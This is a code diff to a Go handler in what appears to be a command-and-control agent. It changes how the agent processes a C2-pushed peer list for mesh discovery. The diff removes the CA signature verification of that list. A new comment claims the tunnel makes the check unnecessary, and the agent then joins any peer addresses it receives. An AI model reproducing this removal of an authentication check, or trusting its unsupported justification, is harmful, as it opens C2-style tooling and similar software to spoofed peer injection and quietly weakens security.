@@ -45,39 +45,32 @@ func HandleC2Command(cmdData *def.MsgTunData) {
 		return
 	}
 
-	// Process PeerList pushed by C2 for mesh discovery
+	// Process the peer list pushed by C2 for mesh discovery. The list is
+	// authenticated by the PFS tunnel, so no additional signature check is
+	// needed here.
 	if cmdData.Tag == def.TagPeerList {
-		if cmdData.EnrichedPeerList != nil && len(cmdData.EnrichedPeerList.Peers) > 0 {
-			cborBytes, err := cbor.Marshal(cmdData.EnrichedPeerList.Peers)
-			if err == nil {
-				valid, sigErr := transport.VerifySignatureWithCA(cborBytes, cmdData.EnrichedPeerList.Signature)
-				if sigErr == nil && valid {
-					logging.Infof("Received valid C2 CA-signed EnrichedPeerList (%d peers)", len(cmdData.EnrichedPeerList.Peers))
-					peerAddrs := make([]string, 0)
-					for _, ep := range cmdData.EnrichedPeerList.Peers {
-						port := ep.MeshGossipPort
-						if port == "" {
-							port = "7946"
-						}
-						fromIP := strings.Split(ep.From, ":")[0]
-						if fromIP != "" && fromIP != "127.0.0.1" {
-							peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", fromIP, port))
-						}
-						for _, ip := range ep.IPs {
-							if ip != "" && ip != "127.0.0.1" && !strings.HasPrefix(ip, "127.") {
-								peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", ip, port))
-							}
-						}
-					}
-					if len(peerAddrs) > 0 {
-						mesh.Join(peerAddrs)
-					}
-				} else {
-					logging.Errorf("EnrichedPeerList signature verification failed: %v", sigErr)
+		if cmdData.EnrichedPeerList == nil || len(cmdData.EnrichedPeerList.Peers) == 0 {
+			return
+		}
+		logging.Infof("Received peer list (%d peers)", len(cmdData.EnrichedPeerList.Peers))
+		peerAddrs := make([]string, 0)
+		for _, ep := range cmdData.EnrichedPeerList.Peers {
+			port := ep.MeshGossipPort
+			if port == "" {
+				port = "7946"
+			}
+			fromIP := strings.Split(ep.From, ":")[0]
+			if fromIP != "" && fromIP != "127.0.0.1" {
+				peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", fromIP, port))
+			}
+			for _, ip := range ep.IPs {
+				if ip != "" && ip != "127.0.0.1" && !strings.HasPrefix(ip, "127.") {
+					peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", ip, port))
 				}
 			}
-		} else if len(cmdData.PeerList) > 0 {
-			mesh.Join(cmdData.PeerList)
+		}
+		if len(peerAddrs) > 0 {
+			mesh.Join(peerAddrs)
 		}
 		return
 	}
